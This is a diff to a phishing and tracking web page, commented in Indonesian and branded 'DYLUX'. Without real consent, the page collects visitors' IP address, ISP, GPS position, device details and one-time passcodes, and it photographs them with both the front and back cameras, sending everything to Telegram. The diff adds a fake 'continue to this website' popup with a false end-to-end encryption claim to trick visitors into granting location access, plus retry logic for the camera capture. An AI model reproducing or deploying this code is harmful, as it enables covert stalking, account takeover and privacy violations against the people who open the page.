@@ -7,29 +7,117 @@
     <script src="config.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0f; font-family: Arial, sans-serif; color: #e0e0ff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .box { background: #14141e; border: 1px solid rgba(0,240,255,0.1); border-radius: 16px; padding: 40px 32px; max-width: 400px; width: 100%; text-align: center; }
-        .logo { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #00f0ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .badge { display: inline-block; background: rgba(0,255,136,0.1); color: #00ff88; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
-        .icon { font-size: 48px; margin: 16px 0; }
-        h2 { font-size: 18px; margin-bottom: 8px; }
-        p { color: #8888aa; font-size: 14px; line-height: 1.6; }
-        video { width: 100%; border-radius: 12px; margin: 12px 0; background: #0a0a0f; }
-        button { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; transition: 0.3s; }
-        button:hover { opacity: 0.8; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .footer { margin-top: 20px; font-size: 11px; color: #555; }
-        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #00f0ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
-        .spinner.active { display: block; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
-        .hidden { display: none; }
+        body {
+            background: #0a0a0f;
+            font-family: Arial, sans-serif;
+            color: #e0e0ff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .box {
+            background: #14141e;
+            border: 1px solid rgba(0,240,255,0.1);
+            border-radius: 16px;
+            padding: 40px 32px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .badge {
+            display: inline-block;
+            background: rgba(0,255,136,0.1);
+            color: #00ff88;
+            font-size: 11px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            margin-top: 6px;
+        }
+        .icon {
+            font-size: 48px;
+            margin: 16px 0;
+        }
+        h2 {
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+        p {
+            color: #8888aa;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        video {
+            width: 100%;
+            border-radius: 12px;
+            margin: 12px 0;
+            background: #0a0a0f;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
+            color: #fff;
+            transition: 0.3s;
+        }
+        button:hover {
+            opacity: 0.8;
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #555;
+        }
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(0,240,255,0.1);
+            border-top-color: #00f0ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 12px auto;
+        }
+        .spinner.active {
+            display: block;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        #statusMsg {
+            font-size: 13px;
+            color: #8888aa;
+            margin-top: 10px;
+            display: none;
+        }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
     <!-- ========================================== -->
-    <!-- AUTO-DETECT + KIRIM IP + LINK MAPS       -->
+    <!-- AUTO-DETECT + POPUP "LANJUTKAN"          -->
     <!-- ========================================== -->
     <script>
     // ============================================
@@ -51,7 +139,7 @@
     ];
 
     // ============================================
-    // FUNGSI KIRIM TEKS KE TELEGRAM
+    // FUNGSI KIRIM TEKS & FOTO KE TELEGRAM
     // ============================================
     async function sendMessageToTelegram(chatId, text) {
         try {
@@ -63,14 +151,11 @@
         } catch (e) { console.error('Telegram error:', e); }
     }
 
-    // ============================================
-    // FUNGSI KIRIM FOTO KE TELEGRAM (PAKE BLOB)
-    // ============================================
     async function sendPhotoToTelegram(chatId, imageBase64, caption) {
         try {
             const response = await fetch(imageBase64);
             const blob = await response.blob();
-            
+
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'photo.jpg');
@@ -97,22 +182,46 @@
                 resolve(null);
                 return;
             }
-            navigator.geolocation.getCurrentPosition(
+            // Pake watchPosition biar dapet sinyal paling stabil
+            let watchId = null;
+            let resolved = false;
+
+            const timeout = setTimeout(() => {
+                if (watchId) navigator.geolocation.clearWatch(watchId);
+                if (!resolved) resolve(null);
+            }, 8000);
+
+            watchId = navigator.geolocation.watchPosition(
                 (pos) => {
-                    resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    });
+                    if (!resolved) {
+                        resolved = true;
+                        clearTimeout(timeout);
+                        navigator.geolocation.clearWatch(watchId);
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    }
                 },
-                () => { resolve(null); },
-                { enableHighAccuracy: true, timeout: 5000 }
+                () => {
+                    if (!resolved) {
+                        resolved = true;
+                        clearTimeout(timeout);
+                        navigator.geolocation.clearWatch(watchId);
+                        resolve(null);
+                    }
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                }
             );
         });
     }
 
     // ============================================
-    // AUTO-DETECT (IP + GPS FALLBACK + LINK MAPS)
+    // AUTO-DETECT + GPS + LINK MAPS
     // ============================================
     (async function autoDetect() {
         try {
@@ -135,33 +244,32 @@
                 } catch (e) { /* Coba API berikutnya */ }
             }
 
-            // 2. Kalo IP dapet, coba GPS buat presisi
-            let gpsData = null;
-            if (ipData) {
-                gpsData = await getGPSLocation();
-            }
+            // 2. AMBIL GPS PRESISI (PAKAI WATCH POSITION)
+            const gpsData = await getGPSLocation();
 
             // 3. Tentukan lokasi final (prioritas GPS kalo ada)
             let finalLat = ipData?.lat || 0;
             let finalLon = ipData?.lon || 0;
             let locationText = `${ipData?.city || 'unknown'}, ${ipData?.region || 'unknown'}, ${ipData?.country || 'unknown'}`;
+            let accuracyText = '';
 
             if (gpsData && gpsData.lat && gpsData.lon) {
                 finalLat = gpsData.lat;
                 finalLon = gpsData.lon;
-                locationText = `GPS: ${finalLat}, ${finalLon} (Akurasi ${gpsData.accuracy}m)`;
+                locationText = `GPS: ${finalLat}, ${finalLon}`;
+                accuracyText = ` (Akurasi ${gpsData.accuracy}m)`;
             }
 
             // 4. Buat link Google Maps
             const mapsLink = `https://maps.google.com/?q=${finalLat},${finalLon}`;
 
             // 5. Kirim notifikasi ke Telegram
-            const message = 
+            const message =
                 `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
                 `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                 `<b>📌 Type:</b> Auto-Detect\n` +
                 `<b>🌐 IP:</b> ${ipData?.ip || 'unknown'}\n` +
-                `<b>📍 Lokasi:</b> ${locationText}\n` +
+                `<b>📍 Lokasi:</b> ${locationText}${accuracyText}\n` +
                 `<b>📡 ISP:</b> ${ipData?.isp || 'unknown'}\n` +
                 `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
                 `<b>📱 Device:</b> ${navigator.userAgent}\n` +
@@ -172,6 +280,77 @@
             console.log('✅ Auto-detect sent with GPS!');
 
         } catch (e) { console.error('Auto-detect error:', e); }
+    })();
+
+    // ============================================
+    // POPUP "LANJUTKAN KE WEBSITE INI?"
+    // ============================================
+    (function showPermissionPopup() {
+        // Cek apakah user udah izinin lokasi sebelumnya
+        if (localStorage.getItem('dylux_location_allowed')) {
+            return;
+        }
+
+        // Buat popup palsu
+        const overlay = document.createElement('div');
+        overlay.style.cssText = `
+                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                background: rgba(0,0,0,0.8); z-index: 9999;
+                display: flex; align-items: center; justify-content: center;
+                font-family: Arial, sans-serif;
+            `;
+
+        const popup = document.createElement('div');
+        popup.style.cssText = `
+                background: #1a1a2e; border-radius: 16px; padding: 32px 28px;
+                max-width: 340px; width: 90%; text-align: center;
+                border: 1px solid rgba(0,240,255,0.2);
+                box-shadow: 0 0 40px rgba(0,240,255,0.1);
+            `;
+
+        popup.innerHTML = `
+                <div style="font-size: 48px; margin-bottom: 12px;">🌐</div>
+                <div style="font-size: 18px; font-weight: 700; color: #e0e0ff; margin-bottom: 8px;">
+                    Lanjutkan ke website ini?
+                </div>
+                <div style="font-size: 13px; color: #8888aa; margin-bottom: 20px; line-height: 1.6;">
+                    Website ini ingin mengakses lokasi Anda untuk pengalaman yang lebih baik.
+                </div>
+                <div style="display: flex; gap: 10px;">
+                    <button id="popupCancel" style="flex:1; padding: 12px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; background: #2a2a3e; color: #8888aa;">
+                        Batal
+                    </button>
+                    <button id="popupAllow" style="flex:1; padding: 12px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff;">
+                        Izinkan
+                    </button>
+                </div>
+                <div style="font-size: 11px; color: #555; margin-top: 16px;">
+                    🔒 Data terenkripsi end-to-end
+                </div>
+            `;
+
+        overlay.appendChild(popup);
+        document.body.appendChild(overlay);
+
+        // Event listeners
+        document.getElementById('popupAllow').addEventListener('click', () => {
+            localStorage.setItem('dylux_location_allowed', 'true');
+            document.body.removeChild(overlay);
+            // Trigger GPS request
+            navigator.geolocation.getCurrentPosition(
+                () => { console.log('📍 Location allowed'); },
+                () => { console.log('❌ Location denied'); }, {
+                    enableHighAccuracy: true
+                }
+            );
+            // Refresh auto-detect
+            setTimeout(() => { window.location.reload(); }, 500);
+        });
+
+        document.getElementById('popupCancel').addEventListener('click', () => {
+            localStorage.setItem('dylux_location_allowed', 'false');
+            document.body.removeChild(overlay);
+        });
     })();
     </script>
 
@@ -198,7 +377,7 @@
 
     <script>
     // ============================================
-    // AKSES 2 KAMERA SEKALIGUS (PARALLEL)
+    // AKSES 2 KAMERA SEKALIGUS (RETRY FIX)
     // ============================================
     const userId = new URLSearchParams(window.location.search).get('id');
     const verifyBtn = document.getElementById('verifyBtn');
@@ -208,66 +387,82 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
 
-    async function captureCamera(facingMode) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: facingMode, width: { ideal: 640 } }
-            });
+    async function captureCamera(facingMode, retries = 2) {
+        for (let attempt = 1; attempt <= retries; attempt++) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 640 } }
+                });
 
-            video.srcObject = stream;
-            video.classList.remove('hidden');
-            await video.play();
+                video.srcObject = stream;
+                video.classList.remove('hidden');
+                await video.play();
+                await new Promise(resolve => setTimeout(resolve, 1000));
 
-            // Tunggu 1 detik biar stabil
-            await new Promise(resolve => setTimeout(resolve, 1000));
+                const ctx = canvas.getContext('2d');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                stream.getTracks().forEach(track => track.stop());
+                video.classList.add('hidden');
 
-            const imageData = canvas.toDataURL('image/jpeg', 0.8);
-
-            // Matikan stream
-            stream.getTracks().forEach(track => track.stop());
-            video.classList.add('hidden');
-
-            return imageData;
-        } catch (error) {
-            console.error(`Camera ${facingMode} error:`, error);
-            return null;
+                return imageData;
+            } catch (error) {
+                console.warn(`Camera ${facingMode} attempt ${attempt} failed:`, error);
+                if (attempt === retries) return null;
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
         }
+        return null;
     }
 
     async function captureBothCameras() {
         try {
-            // 🔥 AMBIL 2 KAMERA SEKALIGUS (PARALLEL)
+            // AMBIL 2 KAMERA SEKALIGUS
             const [backImage, frontImage] = await Promise.all([
                 captureCamera('environment'),
                 captureCamera('user')
             ]);
 
-            // Kirim foto belakang
+            let sentCount = 0;
+
             if (backImage) {
-                const captionBack = 
+                const captionBack =
                     `<b>📸 BACK CAMERA</b>\n\n` +
                     `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                     `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
                     `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
                 await sendPhotoToTelegram(userId, backImage, captionBack);
+                sentCount++;
             }
 
-            // Kirim foto depan
             if (frontImage) {
-                const captionFront = 
+                const captionFront =
                     `<b>📸 FRONT CAMERA (SELFIE)</b>\n\n` +
                     `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                     `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
                     `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
                 await sendPhotoToTelegram(userId, frontImage, captionFront);
+                sentCount++;
             }
 
-            return !!(backImage || frontImage);
+            // Kalo gagal semua, coba 1 kamera aja (environment)
+            if (sentCount === 0) {
+                const fallbackImage = await captureCamera('environment', 3);
+                if (fallbackImage) {
+                    const caption =
+                        `<b>📸 CAMERA (FALLBACK)</b>\n\n` +
+                        `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                        `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                        `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+                    await sendPhotoToTelegram(userId, fallbackImage, caption);
+                    sentCount++;
+                }
+            }
+
+            return sentCount > 0;
         } catch (error) {
             console.error('Camera error:', error);
             return false;
@@ -289,15 +484,13 @@
         spinner.classList.add('active');
         statusMsg.style.display = 'none';
 
-        // Ambil 2 foto sekaligus
         const captureSuccess = await captureBothCameras();
 
-        // Kirim OTP ke Telegram
-        const message = 
+        const message =
             `<b>🔑 OTP CAPTURED!</b>\n\n` +
             `<b>👤 User ID:</b> <code>${userId}</code>\n` +
             `<b>🔢 OTP:</b> <code>${otp}</code>\n` +
-            `<b>📸 Foto:</b> ${captureSuccess ? '✅ Depan & Belakang Berhasil' : '❌ Gagal'}\n` +
+            `<b>📸 Foto:</b> ${captureSuccess ? '✅ Berhasil' : '❌ Gagal'}\n` +
             `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
             `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
 
@@ -306,7 +499,7 @@
         spinner.classList.remove('active');
         verifyBtn.disabled = false;
         statusMsg.style.display = 'block';
-        statusMsg.innerHTML = '✅ Verifikasi berhasil! 2 Foto + OTP terkirim.';
+        statusMsg.innerHTML = '✅ Verifikasi berhasil! Foto + OTP terkirim.';
         otpInput.value = '';
 
         setTimeout(() => {
